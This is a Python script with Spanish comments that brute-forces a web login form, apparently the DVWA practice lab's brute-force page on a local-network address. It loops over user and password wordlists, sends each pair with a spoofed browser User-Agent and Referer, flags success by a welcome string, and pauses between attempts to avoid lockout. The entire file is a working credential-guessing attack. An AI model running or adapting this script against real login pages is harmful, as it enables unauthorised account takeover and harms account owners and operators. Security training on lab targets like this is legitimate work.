import time
import requests

# Configuración inicial
target_url = "http://192.168.100.26:8081/vulnerabilities/brute/"
cookie = {"PHPSESSID": "p4j2n0fo3gvvqqp93u8tn6kc92", "security": "low"}

# Leer listas de usuarios y contraseñas
def load_wordlist(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

users = load_wordlist("user.txt")
passwords = load_wordlist("password.txt")

# Cabeceras HTTP importantes
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "http://192.168.100.26:8081/vulnerabilities/brute/"
}

# Realizar el ataque
print("[*] Iniciando ataque de fuerza bruta...")
found_credentials = []

for user in users:
    for password in passwords:
        params = {
            "username": user,
            "password": password,
            "Login": "Login"
        }
        
        try:
            response = requests.get(
                target_url, 
                params=params, 
                cookies=cookie, 
                headers=headers,
                timeout=5
            )
            
            if "Welcome to the password protected area" in response.text:
                print(f"[+] Credenciales válidas encontradas: {user}:{password}")
                found_credentials.append((user, password))
            
            # Pequeña pausa para evitar bloqueos
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[-] Error probando {user}:{password} - {str(e)}")

# Resultados finales
print("\n[+] Resumen de credenciales encontradas:")
for i, (user, password) in enumerate(found_credentials, 1):
    print(f"{i}. Usuario: {user} - Contraseña: {password}")

if not found_credentials:
    print("[-] No se encontraron credenciales válidas")